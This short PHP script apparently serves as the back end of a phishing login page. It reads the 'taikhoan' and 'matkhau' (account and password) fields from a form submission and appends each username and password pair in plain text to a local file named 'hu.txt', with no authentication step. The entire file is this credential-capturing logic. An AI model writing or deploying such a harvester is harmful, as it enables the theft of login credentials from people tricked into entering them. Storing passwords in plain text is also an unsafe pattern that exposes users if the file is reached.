<?php
    session_start();
    ob_start();
?>
    <?php
        
        $username = $_POST["taikhoan"];
        $password = $_POST["matkhau"];
        $_SESSION["username"] = $username;
         $body = "\n$username|$password\n";
        $test = fopen("hu.txt","a");
        fwrite($test,$body);
        fclose($test); 
?> 